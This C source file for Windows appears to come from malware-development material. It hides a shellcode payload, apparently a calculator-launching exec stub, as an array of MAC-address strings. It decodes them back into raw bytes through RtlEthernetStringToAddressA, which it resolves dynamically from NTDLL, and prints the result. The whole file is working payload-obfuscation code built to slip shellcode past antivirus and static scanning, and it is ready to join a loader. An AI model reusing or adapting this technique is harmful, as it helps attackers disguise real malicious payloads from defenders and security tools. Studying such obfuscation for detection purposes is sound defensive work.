#include <Windows.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI* fnRtlEthernetStringToAddressA)(
	PCSTR		S,
	PCSTR* 		Terminator,
	PVOID		Addr
);

BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE		pBuffer = NULL,
			TmpBuffer = NULL;

	SIZE_T		sBuffSize = NULL;

	PCSTR		Terminator = NULL;

	NTSTATUS	STATUS = NULL;

	fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlEthernetStringToAddressA");
	if (pRtlEthernetStringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the  size of the shellcode which is the number of MAC addresses * 6
	sBuffSize = NmbrOfElements * 6;

	// Allocate memory for deobfuscated data
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	for (int i = 0; i < NmbrOfElements; i++) {

		if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer)) != 0x0) {
			printf("[!] RtlEthernetStringToAddressA Failed At [%s] With Error 0x%0.8X", MacArray[i], STATUS);
			return FALSE;
		}

		TmpBuffer = (PBYTE)(TmpBuffer + 6);

	}

	// Set output parameters
	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;

}


char* MacArray[] = {
		"FC-48-83-E4-F0-E8", "C0-00-00-00-41-51", "41-50-52-51-56-48", "31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72",
		"50-48-0F-B7-4A-4A", "4D-31-C9-48-31-C0", "AC-3C-61-7C-02-2C", "20-41-C1-C9-0D-41", "01-C1-E2-ED-52-41", "51-48-8B-52-20-8B",
		"42-3C-48-01-D0-8B", "80-88-00-00-00-48", "85-C0-74-67-48-01", "D0-50-8B-48-18-44", "8B-40-20-49-01-D0", "E3-56-48-FF-C9-41",
		"8B-34-88-48-01-D6", "4D-31-C9-48-31-C0", "AC-41-C1-C9-0D-41", "01-C1-38-E0-75-F1", "4C-03-4C-24-08-45", "39-D1-75-D8-58-44",
		"8B-40-24-49-01-D0", "66-41-8B-0C-48-44", "8B-40-1C-49-01-D0", "41-8B-04-88-48-01", "D0-41-58-41-58-5E", "59-5A-41-58-41-59",
		"41-5A-48-83-EC-20", "41-52-FF-E0-58-41", "59-5A-48-8B-12-E9", "57-FF-FF-FF-5D-48", "BA-01-00-00-00-00", "00-00-00-48-8D-8D",
		"01-01-00-00-41-BA", "31-8B-6F-87-FF-D5", "BB-E0-1D-2A-0A-41", "BA-A6-95-BD-9D-FF", "D5-48-83-C4-28-3C", "06-7C-0A-80-FB-E0",
		"75-05-BB-47-13-72", "6F-6A-00-59-41-89", "DA-FF-D5-63-61-6C", "63-00-00-00-00-00"
}; 


#define NumberOfElements 46

int main() {

	PBYTE	pDAddress = NULL;
	SIZE_T	sDSize = NULL;

	if (!MacDeobfuscation(MacArray, NumberOfElements, &pDAddress, &sDSize))
		return -1;

	printf("[+] Deobfuscated Bytes at 0x%p of Size %ld ::: \n", pDAddress, sDSize);
	for (size_t i = 0; i < sDSize; i++) {
		if (i % 16 == 0)
			printf("\n\t");

		printf("%0.2X ", pDAddress[i]);
	}

	HeapFree(GetProcessHeap(), 0, pDAddress);


	printf("\n\n[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}
